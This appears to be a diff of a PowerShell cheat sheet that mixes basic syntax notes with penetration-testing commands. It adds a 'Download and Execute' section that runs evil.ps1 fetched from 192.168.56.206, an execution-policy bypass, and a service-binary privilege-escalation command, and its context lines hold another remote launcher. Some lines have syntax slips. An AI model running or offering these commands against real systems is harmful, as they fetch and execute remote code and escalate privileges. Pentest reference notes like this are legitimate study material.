@@ -7,8 +7,23 @@ Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Ser
 + -gt 5
 + -lt 0
 
+### Data Types
+#### Array
+```
+$a = 1..5
+$c = 'a','b','c'
+(System.Object[])
+[int32[]]$d = 1,2,3,4
+```
+
+
 #### Wildcard Matching
 -like 'powersh*'
+
+### Help
+#### Find All Cmdlets
+Get-Cmdlet \*
+Get-Command Get-Alias
 
 ## Remoting
 ------
@@ -146,6 +161,10 @@ Invoke-Expression
 powershell -Command "$ip='http://A.B.C.D:22/launcher.ps1; IEX (New-Object Net.webclient).DownloadString($ip)"
 #### Run remote HTA (in-memory)
 
+#### Invoke Vulnerable Service
+Install-ServiceBinary -ServiceName 'VulnSVC'
+#### 
+
 #### Encoded Commands
 + -encodedcommand
 + -e
@@ -189,6 +208,8 @@ Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational -MaxEvents 5
 ------
 #### List Environment Variables
 Get-ChildItem Env:
+#### Clear value from variable
+Clear-Variable -Name foo
 #### List $PATH Environment Variable
 (gci env:PATH).value.replace(";","\`n")
 #### Quickly list out numbers
@@ -234,3 +255,18 @@ public class User32{
 Add-Type $User32
 [User32]::MessageBox(0,"This is an alert", "MyBox", 0)
 ```
+
+#### Determine Execution Policy 
+Get-ExecutionPolicy -List
+#### Set Execution Policy to Bypass
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
+powershell.exe -ExecutionPolicy bypass
+
+
+## Dotnet Interaction
+#### Access static method with reference to class
+(New Object Namespace.Class).Method()
+
+#### Download and Execute
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.206:6666/evil.ps1')
+IEX ( iwr ''http://192.168.56.206:6666/evil.ps1")
